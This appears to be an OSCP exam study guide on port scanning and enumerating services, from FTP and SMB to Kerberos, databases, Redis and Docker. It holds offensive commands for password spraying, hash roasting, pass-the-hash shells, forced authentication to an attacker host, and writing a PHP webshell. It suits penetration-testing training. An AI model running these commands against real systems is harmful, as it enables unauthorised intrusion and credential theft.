# OSCP+ KNOWLEDGE BASE — VOLUME 1
## FINDING OPEN DOORS: SCANNING (NMAP) + ENUMERATING EVERY SERVICE

> **New here? Read this box first — it unlocks every command in this volume.**
>
> **Placeholders you must replace.** Commands use short stand-ins so you can copy them fast. Before anything works you must set the target IP once, and mentally swap the rest:
> ```bash
> export IP=10.10.10.5        # ← run this ONCE per box; now every "$IP" below becomes your target
> mkdir -p scans              # ← make a folder to save scan output into (commands write here)
> ```
> - `$IP` = the target machine's IP address (you just set it above).
> - `$U` = a **username** you found. `$P` = a **password** you found. Type the real value in place of them.
> - `<something>` = "put your own value here" (e.g. `<domain>` = the target's domain name like `corp.local`).
> - `scans/all-tcp.txt` = just a filename to save results into, so you don't lose them.
>
> **The tags.** Each section has a `[TAG]` in square brackets (like `[ENUM-SMB]`). Tags are **bookmarks**: when a line says *"→ `[WEB-QUICK]`"* it means *"go read that section next"* — press **Ctrl+F**, type the tag, jump there. Difficulty labels:
> - `[MUST-MEMORIZE]` = learn it by heart, you'll type it on every box.
> - `[MUST-RECOGNIZE]` = you don't need it memorized, but know what it does when you see it.
> - `[LOOK-UP]` = niche; fine to look up during the exam, don't cram it.
>
> **The golden habit:** *enumerate everything before attacking anything.* Most beginners fail by rushing the first open port. Scan all ports, then look at **every** service, then pick the easiest way in.

---

# [NMAP] SCANNING — finding which doors are open

**What is Nmap?** A port scanner. A "port" is a numbered door on a computer (0–65535); a program listening behind a door is a "service" (web server, file share, database…). Nmap knocks on the doors and tells you which are **open** and what's behind them. This is always your **first step** on a new target.

## [NMAP-QUICK]  the three scans you'll run on every box  (one screen)
```bash
# 1) Fast: knock on ALL 65535 doors, just tell me which are OPEN   [MUST-MEMORIZE]
nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP
#    -p-           = scan every port (not just the common 1000)
#    --min-rate 2000 = go fast (send ≥2000 packets/sec); lower to 1000 if results look flaky
#    -Pn           = "assume host is up, skip the ping" (many boxes block ping and look 'down')
#    -oN file      = save a readable copy to that file (ALWAYS save — you'll re-read it)

# 2) Deep: for the ports found open, get the software + version + run default checks   [MUST-MEMORIZE]
nmap -p22,80,445 -sCV -Pn -oN scans/services.txt $IP
#    -p22,80,445   = only the ports step 1 found open (replace with your real list)
#    -sC           = run Nmap's "default scripts" (safe probes that reveal extra info)
#    -sV           = detect the exact service + version (e.g. "Apache 2.4.49") → search it for exploits
#    (-sCV is just -sC and -sV together)

# 3) UDP: a few services only answer on UDP (different protocol) — scan the top ones   [MUST-RECOGNIZE]
nmap -sU --top-ports 100 --min-rate 1000 -Pn -oN scans/udp.txt $IP
#    -sU           = scan UDP instead of TCP
#    --top-ports 100 = only the 100 most common UDP ports (full UDP is painfully slow)
```
**Read the results like this:**
- Step 1 tells you *which* doors are open. Note every number.
- Step 2 tells you *what program + version* is behind each door → that version is what you search for known exploits.
- Step 3 catches UDP-only services (SNMP on 161, DNS on 53, TFTP on 69) that TCP scans miss.

## [NMAP-TCP]  the standard two-step, explained  [PRACTICAL]
**Why two steps?** Scanning all 65535 ports *with* version detection is very slow. So: **step 1** finds open ports fast (no version detection); **step 2** does the slow version/script work **only** on the handful that were open. Never run `-sCV -p-` together — you'll wait forever.

**The flags that matter (and what each is for):**
- `-p-` → scan all 65535 ports. Without it, Nmap only checks the common 1000 and **misses services on weird high ports** (a very common way beginners miss the way in).
- `--min-rate 2000` → speed. If a box is fragile and results change between runs, drop to `--min-rate 1000`.
- `-Pn` → skip the "is it alive?" ping. Windows and firewalled boxes often block ping and would otherwise be wrongly reported as "down". **Always use `-Pn`.**
- `-sC` (default scripts), `-sV` (versions) → the info that tells you *how* to attack.
- `-oN scans/file.txt` (readable) or `-oA scans/name` (saves 3 formats at once) → **always save output.** You will re-read scans constantly.
- `-T4` → a coarser speed dial; `--min-rate` is the finer control. Either is fine.

**One-command version (fine for a single box, just slower):**
```bash
nmap -p- -sCV -Pn --min-rate 1500 -oA scans/full $IP    # all ports + versions in one go
```
**Faster port discovery (optional tool):** `rustscan -a $IP -- -sCV -oN scans/services.txt` — rustscan finds open ports very fast, then hands them to Nmap. `[LOOK-UP]`

## [NMAP-UDP]  [PRACTICAL]
UDP scanning is slow and unreliable (UDP services often don't reply, so Nmap has to guess). **Scan the top 100–200 UDP ports, never all of them.**
```bash
nmap -sU --top-ports 200 --min-rate 1000 -Pn $IP
```
- `open|filtered` = "no reply, can't tell" — normal for UDP. For a promising one, probe it directly with its own tool.
- **High-value UDP ports to care about:** 161 (SNMP — often leaks creds!), 53 (DNS), 69 (TFTP), 123 (NTP), 500 (IKE/VPN), 137 (NetBIOS).

## [NMAP-SERVICE-ENUM] / [NMAP-SCRIPTS]  running targeted checks  [PRACTICAL]
Nmap ships with hundreds of small scripts (the "NSE"). You can aim specific ones at a service:
```bash
nmap --script "safe or default" -p<ports> $IP          # run all the safe/standard checks
# service-specific bundles:
nmap --script "smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode" -p445 $IP   # SMB
nmap --script "http-enum,http-title,http-headers,http-methods" -p80 $IP                        # web
nmap --script "ftp-anon,ftp-syst" -p21 $IP                                                     # FTP
nmap --script vuln -p<ports> $IP     # broad "any known vulns?" — NOISY, gives false alarms [LOOK-UP]
```
- Treat `--script vuln` as a **lead generator, not proof** — it flags maybes; you still verify by hand.
- Find a script: `ls /usr/share/nmap/scripts | grep <service>`. Read what it does: `nmap --script-help <name>`.

## [NMAP-TROUBLESHOOTING]  when a scan misbehaves
| What you see | Why | What to do |
|---|---|---|
| Every port says "filtered" | A firewall is dropping your probes, or ping is blocked | Add `-Pn`; lower `--min-rate`; try `-sT` (full-connect scan), especially through a proxy |
| Host reported "down" but the website loads | Ping (ICMP) is blocked | Always use `-Pn` |
| Version looks wrong / "unsure" | The service hides its banner | Probe by hand (`nc`, `curl`, the service's own client); add `--version-intensity 9` |
| Scan is crawling | UDP, or too-high rate on a lossy link | UDP: top-ports only. TCP: `--min-rate 1000` |
| Fails through proxychains | SOCKS proxies can't carry raw SYN/UDP packets | Use `-sT -Pn` (TCP connect) only; no UDP over a proxy |
| Different results each run | Rate too high, packets getting dropped | Lower `--min-rate`, run again |
| Box is clearly up but almost everything is "filtered" | possible **port knocking** (a service opens only after you connect to a secret sequence of ports first) | look for the knock sequence in a config/README/comment you looted; then `for p in 7000 8000 9000; do nmap -Pn -p $p $IP; done` and re-scan — the hidden port opens |

**Time-wasters to avoid (rabbit holes):** believing `--script vuln` without checking; obsessing over a single "filtered" port; running full UDP `-p-`; fussing over exact OS-detection guesses.

---

# ENUMERATING EACH SERVICE — what to do behind every open door

> For each service: **what it is** (plain English) → **commands** (every line commented) → **what to check, what can go wrong, and where it leads.** Jump straight to the port you found open using the decision table at the bottom (`[ENUM-DECISION]`).

## [ENUM-FTP]  Port 21 — FTP (file transfer)
**What it is:** an old way to upload/download files. It's a goldmine when it allows **anonymous** login (username `anonymous`, any password) — you might read config files, backups, or even the website's files. If FTP shares the same folder as the web server, you can sometimes **upload a "webshell"** (a small script that lets you run commands via the browser).
```bash
nmap -p21 -sCV --script ftp-anon $IP          # check the version + whether anonymous login is allowed
ftp $IP                                        # log in interactively — try user: anonymous, password: (just press Enter)
wget -r ftp://anonymous:anonymous@$IP/         # download EVERYTHING on the server, recursively, to your machine
curl ftp://$IP/ --user anonymous:anonymous     # just list the files without logging in interactively
hydra -l $U -P rockyou.txt ftp://$IP           # guess a password — ONLY if you have a real reason [LOOK-UP]
```
**What to check / do:**
- Got in anonymously? **List and download everything.** Try `put testfile` — can you upload? If yes *and* it's the web root → drop a webshell.
- Loot you want: config files, backups, `.txt` files with passwords, source code. **Any password you find, try it on every other service** (people reuse passwords — this is "credential spraying/reuse").
- Downloading a binary and it's corrupt? Type `binary` in the ftp prompt before `get`.

**Known weak spots:** vsftpd 2.3.4 (has a joke backdoor — opens a root shell on port 6200) · ProFTPD 1.3.5 (`mod_copy` lets you copy files → write a webshell) · anonymous **write** access.
**Where it leads:** a webshell, credentials, or source code → see `[FOUND-CREDS]` (Volume 6) and `[WEB-UPLOAD]` (Volume 2).

## [ENUM-SSH]  Port 22 — SSH (remote login shell)
**Big idea:** SSH is almost never the way *in* — it's the **reward**. You rarely break SSH directly; instead you find a password or a private key *somewhere else* (a file, a share, a database) and then log in with it. Don't waste time attacking SSH head-on.
```bash
nmap -p22 -sCV $IP                         # read the version banner (hints at the OS/distro)
ssh $U@$IP                                 # log in with a username + a password you found
chmod 600 id_rsa ; ssh -i id_rsa $U@$IP    # log in with a private KEY file (chmod 600 first, or SSH refuses it)
ssh2john id_rsa > h ; john --wordlist=rockyou.txt h   # key wants a passphrase? crack it (see Volume 3)
hydra -l $U -P rockyou.txt ssh://$IP       # password-guess as a LAST resort — slow and noisy, needs a known user
```
- A **private key** (often a file named `id_rsa`) is like a password-less door key. If you find one, `chmod 600` it (SSH rejects keys that others could read) then log in with `-i`.
- Read `~/.ssh/authorized_keys` and `known_hosts` on any box you get onto — they leak **other usernames and other target machines**.

**Troubleshoot:**
- `Permission denied (publickey)` → wrong key, or wrong username.
- `no matching key exchange/cipher` (very old server) → `ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa $U@$IP`

**Where it leads:** a foothold (your first shell) → `[LINUX-PRIVESC-QUICK]` · tunneling through it → `[PIVOT-SSH]`.

## [ENUM-SMTP]  Ports 25/465/587 — Mail (SMTP)
**What it is:** the mail-sending service. For OSCP its main use is **finding valid usernames** — you ask the mail server "does user X exist?" and it tells you. Those usernames feed Active Directory attacks later.
```bash
nmap -p25 -sCV --script "smtp-commands,smtp-enum-users" $IP   # server capabilities + user-guessing
smtp-user-enum -M RCPT -U users.txt -t $IP    # check a list of names against the server [LOOK-UP]
nc $IP 25                                      # talk to it by hand: type  VRFY root  or  RCPT TO:<user>
```
**What to check:** the banner may leak the mail software and an internal hostname. Valid users → feed them into AD spraying/roasting (`[AD-QUICK]`).

## [ENUM-DNS]  Port 53 — DNS (name lookups)  → also `[TECH-DNS]`
**What it is:** the phone book that turns names (`server.corp.local`) into IPs. The jackpot here is a **zone transfer** — if misconfigured, the server hands you a full list of every internal hostname at once. On Active Directory, DNS also reveals the Domain Controllers.
```bash
dig axfr @$IP <domain>                     # ZONE TRANSFER — dumps ALL records at once (the big win)
dig any @$IP <domain>                       # ask for any records it'll share
dig -x $IP @$IP                             # reverse lookup (IP → name)
dnsrecon -d internal.lan -a -n $IP          # automated enumeration (includes the zone-transfer attempt)
dnsrecon -d <domain> -D wordlist.txt -t brute   # guess subdomain names from a wordlist
nslookup -type=SRV _ldap._tcp.<domain> $IP  # AD trick: locate Domain Controllers via SRV records
```
**What to check / do:** **every hostname you discover, add it to your `/etc/hosts`** file (`sudo nano /etc/hosts`, add a line `<IP>  server.corp.local`) so your tools can reach it by name.
**Where it leads:** new website names to fuzz (`[WEB-CONTENT]`) · identifying the DC (`[AD-ENUM]`).

## [ENUM-HTTP] / HTTPS  Ports 80/443/8080/8000/8443/… — Web
**What it is:** a website. This is the **#1 way into most boxes.** Enumerate **every** HTTP port thoroughly — the full method is Volume 2 (`[WEB-*]`). Quick first look:
```bash
whatweb http://$IP        # identify the tech stack (server, CMS, frameworks)
curl -sI http://$IP       # show just the response headers (server type, redirects, cookies)
# then: view page source · read /robots.txt · brute-force hidden directories · brute-force vhosts
```
**Look for:** the CMS and its version (→ search for exploits), any redirect to a hostname (add it to `/etc/hosts`, then fuzz it as a "vhost"), login pages, file-upload pages, and URL parameters (`?id=1`) to test for injection.
**Where it leads:** SQL injection / file inclusion / file upload / command injection / a known-version exploit → your first shell. **Start at `[WEB-QUICK]` in Volume 2.**

## [ENUM-SMB]  Ports 139/445 — SMB (Windows file sharing)  → also `[TECH-SMB]`
**What it is:** Windows file-and-printer sharing. On a Windows/AD network it's the workhorse: you can sometimes list shared folders and usernames **without any password** ("null session"), test whether creds work, move between machines, and loot files left in shares.

### [SMB-QUICK]  first look  (one screen)
```bash
nxc smb $IP                              # basic info: OS, hostname, domain, signing   [MUST-MEMORIZE]
nxc smb $IP -u '' -p '' --shares         # try to list shared folders with NO credentials (null session)
nxc smb $IP -u 'guest' -p '' --shares    # fallback: try the "guest" account
enum4linux-ng -A $IP                     # throw everything at it automatically (users, shares, policy)
smbclient -N -L //$IP/                   # another way to list shares with no creds (-N = no password)
smbclient -N //$IP/<share>               # connect INTO a share; then use: ls, get <file>, recurse ON
```
> **What is `nxc`?** `nxc` (NetExec, formerly CrackMapExec/`cme`) is a Swiss-army knife for Windows protocols (SMB, WinRM, LDAP, MSSQL…). You'll use it constantly. `smbclient` is a simpler one-share file browser.

**Look for:** `signing:False` (means NTLM-relay attacks are possible), folders you can **read** or **write**, usernames, and the domain name. **Next:** read every readable share; try any found password on other accounts.

### [SMB-ENUM]  deeper enumeration
```bash
nxc smb $IP -u '' -p '' --shares --users     # null session: list shares AND users
nxc smb $IP -u guest -p '' --shares          # guest fallback
nxc smb $IP -u '' -p '' --rid-brute          # pull usernames by cycling ID numbers (works with no creds)
smbclient -N //$IP/Share                      # browse a share; inside: 'recurse ON', 'prompt OFF', then 'mget *'
mount -t cifs //$IP/Share /mnt/s -o username=$U,password=$P   # mount a share locally so you can grep it [LOOK-UP]
nxc smb $IP -u $U -p $P --shares --users --pass-pol --groups  # with creds: full enumeration
nxc smb <hosts.txt> -u users.txt -p 'Password1' --continue-on-success   # spray ONE password at many users/hosts
nxc smb $IP -u $U -H <ntlmhash>              # log in with a HASH instead of a password ("pass-the-hash")
nmap --script smb-vuln-ms17-010 -p445 $IP   # check for EternalBlue (old, unpatched Windows)
```
> **"Spraying"** = trying one likely password against many usernames (safer than hammering one user, which can lock the account). **"Pass-the-hash"** = Windows lets you authenticate with the password's *hash* (a scrambled fingerprint) even if you never cracked the actual password.

**Files worth grabbing from shares:** `Groups.xml` / GPP files (contain an encrypted-but-crackable `cpassword`), login scripts, `web.config`, `unattend.xml`, backups, `.kdbx` (KeePass), `.ps1` scripts, sticky-notes.
**Common misconfigs:** null/guest read access · a **writable** share (drop a `.scf`/`.lnk` file to steal a hash) · SMB signing off (relay attacks).
**Known vulns:** MS17-010 "EternalBlue" (old boxes) · GPP `cpassword`.

### [SMB-ATTACK]  turning SMB access into a shell
```bash
impacket-psexec $U:$P@$IP        # get a SYSTEM shell using ADMIN creds — reliable but "loud"
impacket-wmiexec $U:$P@$IP       # run commands more quietly (no service created)
nxc smb $IP -u $U -p $P -x whoami   # run a single command and see the output
# writable share → drop a malicious .scf/.url/.lnk, run Responder/ntlmrelayx to catch the hash [LOOK-UP]
```
See `[AD-LATERAL]` (Volume 5) for the full "move to another machine" menu.

### [SMB-TROUBLESHOOTING]
| What you see | Meaning / fix |
|---|---|
| `NT_STATUS_ACCESS_DENIED` when listing | null session is disabled → you need real creds |
| `STATUS_LOGON_FAILURE` | wrong creds — check the domain: add `-d DOMAIN` or use `-u DOMAIN/user` |
| `STATUS_ACCOUNT_RESTRICTION` | that account isn't allowed to use SMB / only on certain hosts |
| smbclient: "protocol negotiation failed" | ancient SMBv1 → `smbclient --option='client min protocol=NT1'` |
| `STATUS_NOT_SUPPORTED` | SMBv1 disabled (fine) → use nxc / SMB2 |
| Kerberos "clock skew" errors | your clock differs from the DC → `sudo ntpdate $IP` |

**Where it leads:** creds, loot, moving laterally, and full AD enumeration → `[FOUND-SMB]`, spray creds, `[AD-ENUM]`.

## [ENUM-RPC]  Port 135 (Windows RPC) / Port 111 (Unix RPC)
**What it is:** 135 is a Windows service that can leak **users and domain info** (sometimes when SMB won't). 111 is the Unix "portmapper" that points you to **NFS** file shares.
```bash
rpcclient -U '' -N $IP     # connect with no creds; then type: enumdomusers / enumdomgroups / queryuser 0x<rid> / srvinfo
impacket-rpcdump $IP       # list the available RPC services
rpcinfo -p $IP             # Unix side (111): what RPC services exist
showmount -e $IP           # Unix side: list NFS exports (shared folders)
```
**Where it leads:** usernames (→ spray/roast), NFS shares to mount.

## [ENUM-LDAP]  Ports 389/636/3268/3269 — LDAP (the AD directory)  → `[AD-ENUM]`, `[TECH-LDAP]`
**What it is:** the Active Directory database, queried over the network. An "anonymous bind" (no login) can sometimes dump all users, computers, and their **descriptions** — and admins sometimes stash **passwords in the description field**.
```bash
ldapsearch -x -H ldap://$IP -s base namingcontexts     # find the "base DN" (e.g. dc=corp,dc=local) — you need this
ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local"      # anonymous dump: users, descriptions (creds!), computers
ldapsearch -x -H ldap://$IP -D '$U@corp.local' -w '$P' -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName description   # with creds
nxc ldap $IP -u $U -p $P --users --groups --asreproast asrep.txt --kerberoasting kerb.txt   # users + build roast target lists
ldapdomaindump -u 'corp.local\$U' -p $P $IP            # dump everything to browsable HTML/JSON
```
> `-x` = simple auth, `-H` = the server URL, `-b` = the "base DN" (where in the tree to start — get it from the first command). The **base DN** is just the directory's root path, written like `dc=corp,dc=local` for the domain `corp.local`.

**Where it leads:** full AD enumeration, passwords in descriptions, Kerberoast/AS-REP target lists, and data to feed BloodHound (`[AD-BLOODHOUND]`).

## [ENUM-KERBEROS]  Port 88 — Kerberos (AD login system)  → `[AD-KERBEROAST]`, `[AD-ASREP]`
**What it is:** the authentication system Active Directory uses. **The moment you see port 88 open, this machine is a Domain Controller — switch your whole mindset to "this is AD."**
```bash
sudo ntpdate $IP     # FIRST fix the clock (Kerberos fails if your clock differs from the DC's)
impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt -dc-ip $IP   # AS-REP roast: grab crackable hashes with NO creds
impacket-GetUserSPNs -request <domain>/$U:$P -dc-ip $IP                   # Kerberoast: grab crackable hashes with ANY one cred
```
> **AS-REP roasting** = some accounts are misconfigured so anyone can request a chunk of crackable data (a "hash") for them, no login needed. **Kerberoasting** = with *any* valid account you can request crackable hashes for service accounts. Both hashes get cracked offline in Volume 3.

**Where it leads:** crackable hashes → passwords, and confirmed usernames → `[AD-QUICK]`.

## [ENUM-WINRM]  Ports 5985/5986 — WinRM (remote PowerShell)  → `[TECH-WINRM]`
**What it is:** remote PowerShell access — **if** your account is in the "Remote Management Users" or Administrators group. Once you have working creds, this is a prime way to get an interactive Windows shell.
```bash
nxc winrm $IP -u $U -p $P     # test the creds — if it prints "(Pwn3d!)" you CAN get a shell
evil-winrm -i $IP -u $U -p $P # get the interactive shell (has built-in 'upload' and 'download' commands)
evil-winrm -i $IP -u $U -H <ntlmhash>   # log in with a hash instead of a password
```
> `(Pwn3d!)` in nxc output = "these creds are strong enough to execute here" — a green light.
**Troubleshoot:** nxc validates but evil-winrm fails → the user isn't allowed WinRM. TLS on port 5986 → add `-S`. Kerberos time errors → `ntpdate`.
**Where it leads:** an interactive Windows foothold → `[WINDOWS-PRIVESC-QUICK]`.

## [ENUM-RDP]  Port 3389 — RDP (Remote Desktop, the GUI)  → `[TECH-RDP]`
**What it is:** full graphical remote desktop. With valid creds you get a Windows desktop; very old versions have the risky "BlueKeep" exploit (rarely needed).
```bash
nxc rdp $IP -u $U -p $P                                       # test whether the creds work for RDP
xfreerdp /v:$IP /u:$U /p:$P +clipboard /dynamic-resolution    # connect to the desktop   [MUST-RECOGNIZE]
xfreerdp /v:$IP /u:$U /pth:<ntlmhash>                         # pass-the-hash (needs "Restricted Admin" mode)
xfreerdp /v:$IP /u:$U /p:$P /drive:share,/tmp                 # share your /tmp into the session to move files
```
**Where it leads:** a graphical foothold — handy for running winPEAS visually or moving files via clipboard/mapped drive.

## [ENUM-SNMP]  Port 161/UDP — SNMP (device monitoring)  → `[TECH-SNMP]`
**What it is:** a monitoring protocol. If the "community string" (a shared password) is the default `public`, it happily dumps **running process command-lines (which often contain passwords!), user lists, installed software, and open ports.** High reward, low effort — don't skip it.
```bash
snmpwalk -v2c -c public $IP     # dump everything the device will share
snmp-check $IP -c public        # same data, formatted more nicely
onesixtyone -c common.txt $IP   # guess the community string if 'public' doesn't work
# useful OIDs (an OID is an "address" for a specific piece of data) [LOOK-UP]:
#   processes:      1.3.6.1.2.1.25.4.2.1.2
#   process args:   1.3.6.1.2.1.25.4.2.1.5   ← passwords often hide here
#   installed sw:   1.3.6.1.2.1.25.6.3.1.2
#   user accounts:  1.3.6.1.4.1.77.1.2.25
```
**Where it leads:** passwords in process arguments, usernames, internal software/ports.

## [ENUM-NFS]  Port 2049 (+111) — NFS (Unix file sharing)  → `[TECH-NFS]`
**What it is:** the Unix version of SMB. Shared folders ("exports") may be world-readable/writable, and a setting called **`no_root_squash`** can hand you root.
```bash
showmount -e $IP                              # list the shared folders (exports)
mount -t nfs $IP:/export /mnt/nfs -o nolock   # mount one locally so you can read it (creds, keys, source)
```
**What to check / do:**
- Is `no_root_squash` set? Then on **your** machine (as root) drop a special "SUID root" program into the mounted folder; running it on the target as a low-priv user gives you **root** (full steps in `[LINUX-PRIVESC]`, NFS section).
- Files show wrong owner / you can't read them? Create a local user with the **same UID number** as the file's owner.
**Where it leads:** creds/keys, or root via the SUID trick.

## [ENUM-MSSQL]  Port 1433 — Microsoft SQL Server  → `[SQLI-MSSQL]`, `[TECH-SQL]`
**What it is:** Microsoft's database. With creds you can often run OS commands (`xp_cmdshell`), steal/relay Windows hashes, or impersonate the `sa` (admin) account.
```bash
nxc mssql $IP -u $U -p $P                        # test the creds
impacket-mssqlclient $U:$P@$IP -windows-auth     # connect; then, INSIDE the client prompt:
#   enable_xp_cmdshell                            #   turn on command execution
#   xp_cmdshell 'whoami'                          #   run an OS command (needs sysadmin/impersonation)
#   EXEC xp_dirtree '\\<yourKaliIP>\x'            #   force it to auth to YOU → catch the hash on Responder
#   EXEC AS LOGIN='sa'                            #   become 'sa' if impersonation is allowed
#   SELECT * FROM master..sysservers              #   list "linked servers" → hop to another DB/host
```
**Where it leads:** command execution as the SQL service account (often has SeImpersonate → SYSTEM), hash capture, or lateral movement via linked servers.

## [ENUM-MYSQL]  Port 3306 — MySQL  → `[SQLI-MYSQL]`
```bash
mysql -h $IP -u root -p                # try passwords: blank, 'root', 'toor'
nmap -p3306 --script mysql-empty-password,mysql-info $IP   # check for a blank root password
#   once inside:  show databases;  use <db>;  show tables;  select * from users;   → app creds/hashes
#   if the account has FILE privilege:
#     SELECT LOAD_FILE('/etc/passwd');                              # read a file off the server
#     SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/sh.php';   # write a webshell
```
**Where it leads:** application creds/hashes (→ spray) and file read/write (→ webshell). UDF RCE if the plugin dir is writable `[LOOK-UP]`.

## [ENUM-POSTGRES]  Port 5432 — PostgreSQL  → `[SQLI-POSTGRES]`
```bash
psql -h $IP -U postgres      # try password: 'postgres' or blank
nxc postgres $IP -u $U -p $P # test creds
#   command execution (superuser, v9.3+):  COPY t FROM PROGRAM 'id';
#   read a file:                           COPY t FROM '/etc/passwd';    [LOOK-UP]
```
**Where it leads:** command execution as the postgres user, file read.

## [ENUM-REDIS]  Port 6379 — Redis (in-memory database)
**What it is:** a fast key-value store that is **frequently left with no password.** If so, you can often write files to disk → drop a webshell, an SSH key, or a cron job.
```bash
redis-cli -h $IP        # connect; then type: info ; config get dir ; keys *
#   no-auth file write trick: set 'dir' + 'dbfilename' to the web root or ~/.ssh, then save
#     → writes a webshell or an authorized_keys file
#   MODULE LOAD → full command execution on some versions [LOOK-UP]
```
**Where it leads:** file write → foothold; stored data (session tokens, creds).

## [ENUM-MONGODB]  Port 27017 — MongoDB
```bash
mongosh --host $IP        # or the older:  mongo $IP
#   show dbs ;  use <db> ;  show collections ;  db.users.find()    → dump app users/hashes/tokens (often no auth)
```
**Where it leads:** creds/tokens for the application.

## [ENUM-GIT]  an exposed `.git` folder over HTTP  → `[FOUND-GIT]`
**What it is:** source code + its full history. Repos often contain **hard-coded passwords, API keys, and endpoints** — sometimes in files that were "deleted" but still live in history.
```bash
git-dumper http://$IP/.git ./loot                  # download the whole exposed repo [LOOK-UP] (or: wget -r)
git log -p | grep -iE 'pass|secret|key|token'       # search the ENTIRE history for secrets
git show ; git stash list                           # look at deleted / stashed content
```
**Where it leads:** creds, source to find bugs in, config files with DB/API keys.

## [ENUM-DOCKER]  Ports 2375/2376, or a container you land inside
```bash
docker -H tcp://$IP:2375 ps                                          # is the Docker API exposed with no auth?
docker -H tcp://$IP:2375 run -v /:/host -it alpine chroot /host sh   # if yes → mount the host's disk = host root
# if you're INSIDE a container: check /.dockerenv, your capabilities, mounted host paths, and /var/run/docker.sock → escape
```
**Where it leads:** taking over the host from a container (see `[LINUX-PRIVESC]`, Docker/LXD).

## [ENUM-ORACLE]  Port 1521 — Oracle Database (TNS)
**What it is:** an Oracle database. It's fiddly and has its own tools. The way in is usually: find a valid **SID** (the database's name), then log in with **default creds** (`scott/tiger`, `system/manager`, `sys/change_on_install`), then get command execution.
```bash
sudo apt install oracle-instantclient  # if sqlplus/odat aren't installed
nmap -p1521 -sV --script "oracle-tns-version,oracle-sid-brute" $IP   # version + guess the SID
odat sidguesser -s $IP -p 1521                     # brute-force the SID (the database name)
odat passwordguesser -s $IP -p 1521 -d <SID>       # guess default username/passwords for that SID
tnscmd10g version -h $IP                            # query the TNS listener directly
sqlplus <user>/<pass>@$IP:1521/<SID>               # log in once you have creds
odat utlfile -s $IP -d <SID> -U <user> -P <pass> --putFile C:\\ shell.exe local.exe   # upload a file (→ RCE)
```
**Where it leads:** with creds → file read/write and command execution as the Oracle service account (often high-priv on Windows → SeImpersonate → SYSTEM). Default creds are the usual foothold.

## [ENUM-VNC]  Port 5900(+) — VNC (remote desktop)
**What it is:** a graphical remote-desktop service (like RDP, cross-platform). Some versions have an auth-bypass; weak/blank passwords are common; a found password often unlocks a desktop already logged in as a privileged user.
```bash
nmap -p5900 --script "vnc-info,realvnc-auth-bypass,vnc-title" $IP   # info + CVE-2006-2369 auth bypass check
vncviewer $IP                                       # connect (prompts for the VNC password)
vncviewer $IP -passwd /path/to/vnc.passwd           # use a captured .vnc password file
# crack a captured VNC password file:  vncpwd vnc.passwd   (or the 'vncdec' tools)
hydra -P rockyou.txt vnc://$IP                       # brute the password (last resort)
```
**Where it leads:** a graphical session (often as an already-logged-in, sometimes admin, user).

## [ENUM-IPMI]  Port 623/UDP — IPMI (server management)
**What it is:** a "lights-out" management interface on server hardware. Its big weakness: **IPMI 2.0 will hand you a password hash for any valid user before you even authenticate** (CVE-2013-4786) → crack it offline.
```bash
nmap -sU -p623 --script ipmi-version,ipmi-cipher-zero $IP     # detect + check for the cipher-zero auth bypass
# dump password hashes (Metasploit — your ONE MSF box, or just to grab the hash):
#   use auxiliary/scanner/ipmi/ipmi_dumphashes    → gives a hashcat -m 7300 (RAKP) hash
hashcat -m 7300 ipmi.hash rockyou.txt                # crack the captured RAKP hash
# default creds to try: ADMIN/ADMIN, root/calvin (Dell), admin/admin
```
**Where it leads:** admin creds for the server's management controller (→ often the OS).

## [ENUM-UNUSUAL-PORTS]  a generic method for any port you don't recognise
When you meet an unknown port, work through these:
1. `nc -nv $IP <port>` → grab the banner; try sending a newline, then `HELP`, then `GET / HTTP/1.0`.
2. `nmap -p<port> -sCV --version-intensity 9 $IP` → force harder version detection.
3. Google the banner/version text + "exploit" or "default credentials".
4. Try it as web (`curl`), then as TLS (`openssl s_client -connect $IP:<port>`), then with the service's own client.
5. `searchsploit <product>`. **Treat every listening port as a possible way in.**

---

# [ENUM-DECISION]  "Port X is open → go read this section"
Use your Nmap results, then jump (Ctrl+F the tag):
```
21  FTP        → [ENUM-FTP]      (anonymous? can you upload? version exploit?)
22  SSH        → [ENUM-SSH]      (have creds/keys? otherwise it's a payoff, not a way in)
25  SMTP       → [ENUM-SMTP]     (enumerate usernames)
53  DNS        → [ENUM-DNS]      (zone transfer, AD SRV records)
80/443/8080…   → [WEB-QUICK]     (Volume 2 — always enumerate web fully)
88  KERBEROS   → it's AD! → [AD-QUICK] + [ENUM-KERBEROS]
110/143 POP/IMAP → test creds, loot mailboxes
111 RPC        → showmount → NFS → [ENUM-NFS]
135 MSRPC      → rpcclient user enum → [ENUM-RPC]
139/445 SMB    → [ENUM-SMB] / [SMB-QUICK]
161 SNMP       → snmpwalk → [ENUM-SNMP]
389/636/3268 LDAP → [ENUM-LDAP] + [AD-ENUM]
623 IPMI       → [ENUM-IPMI]  (UDP — dump the hash)
1433 MSSQL     → [ENUM-MSSQL]
1521 Oracle    → [ENUM-ORACLE]
2049 NFS       → [ENUM-NFS]
3306 MySQL     → [ENUM-MYSQL]
3389 RDP       → [ENUM-RDP]
5432 Postgres  → [ENUM-POSTGRES]
5900 VNC       → [ENUM-VNC]
5985/5986 WinRM → [ENUM-WINRM]
6379 Redis     → [ENUM-REDIS]
27017 Mongo    → [ENUM-MONGODB]
2375 Docker    → [ENUM-DOCKER]
anything else  → [ENUM-UNUSUAL-PORTS]
```

---
*End Volume 1. Next: Volume 2 (Web & SQL Injection) — how to break the websites you just found.*
